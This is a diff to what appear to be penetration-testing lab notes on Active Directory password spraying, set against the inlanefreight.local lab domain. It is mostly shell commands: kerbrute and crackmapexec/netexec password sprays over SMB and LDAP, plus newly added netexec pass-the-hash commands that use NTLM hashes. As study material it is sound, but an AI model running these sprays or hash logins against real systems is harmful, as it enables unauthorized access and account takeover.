@@ -297,17 +297,20 @@ for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;qu
 ```shell
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 ```
-- crackMapExec  / netexec (against smb or ldap)
+- crackMapExec  / netexec
 ```shell
 sudo crackmapexec smb 172.16.5.5-10 -u valid_users.txt -p Password123 | grep +
 
-sudo netexec 172.16.5.5-10 ldap -u valid_users.txt  -p Password123 
-```
+sudo netexec 172.16.5.5-10 ldap -u valid_users.txt  -p Password123
 
-```shell
 sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
-```
 
+
+# you're targeting a non-domain or local account
+netexec smb 192.168.110.52-56  -d . -u James  -H :8af1903d3c80d3552a84b6ba296db2ea --shares 
+netexec smb 192.168.110.52-56  -u James  -H :8af1903d3c80d3552a84b6ba296db2ea  --local-auth 
+
+```
 **From Windows**
 
 - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (against ldap)
